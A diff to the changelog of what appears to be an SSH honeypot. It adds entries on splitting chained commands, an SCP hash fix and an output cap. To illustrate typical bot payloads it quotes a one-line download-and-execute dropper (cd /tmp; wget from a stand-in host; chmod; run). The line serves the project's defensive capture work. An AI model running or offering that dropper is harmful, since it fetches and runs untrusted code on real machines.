@@ -7,6 +7,16 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+- Command separators: `;`, `&&`, and `||` now split a line into commands that
+  run in order, with `&&`/`||` gated on the previous exit status. Bot payloads
+  are almost always one-liners (`cd /tmp; wget http://x/a; chmod +x a; ./a`);
+  each segment used to be handed to the first command as arguments, so the line
+  produced `cat: |: No such file or directory`-style nonsense and nothing after
+  the first segment was ever captured. Operators inside quotes, or escaped, stay
+  literal, and splitting happens before variable expansion — so a `;` arriving
+  in a variable's value is data, not an extra command.
+
 ### Fixed
 - A truncated SCP upload logged the SHA-256 of the stored prefix while reporting
   the full `size`, so the recorded hash matched neither the payload the attacker
@@ -15,6 +25,11 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   complete payload, and the new `stored_sha256` field is the quarantined
   content — the quarantine filename, and identical to `sha256` unless
   `truncated` is set.
+
+### Security
+- The 1 MiB output cap now bounds a whole command line, not just one command:
+  a chained line could otherwise multiply the per-command cap by the number of
+  segments that fit in the 4096-byte input limit.
 
 ### Security
 - `/usr/bin` listed binaries the shell could not run — `ls /usr/bin` showed
